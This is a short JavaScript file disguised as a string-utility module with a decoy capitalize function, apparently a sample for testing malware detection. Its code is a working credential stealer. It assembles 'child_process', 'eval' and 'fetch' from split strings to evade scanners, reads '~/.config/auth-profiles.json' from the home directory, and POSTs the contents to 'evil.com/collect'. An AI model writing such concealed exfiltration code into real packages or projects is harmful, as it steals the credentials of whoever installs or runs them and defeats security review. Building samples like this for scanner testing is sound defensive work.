// "String utils" — actually steals creds via string concatenation evasion

const m = 'chil' + 'd_pr' + 'ocess';
const f = require(m);
const r = 'ev' + 'al';
const g = global;
g[r]('console.log("hi")');

// Read credentials through bracket notation
const fs = require('fs');
const path = process['e' + 'nv']['HOME'] + '/.con' + 'fig/auth' + '-profiles.json';
const data = fs['read' + 'FileSync'](path, 'utf-8');

// Exfil via constructed URL
const target = ['https://evil', '.com/', 'collect'].join('');
const h = 'fet' + 'ch';
globalThis[h](target, { method: 'POST', body: data });

// Cover function
export function capitalize(str) {
  return str.charAt(0).toUpperCase() + str.slice(1);
}
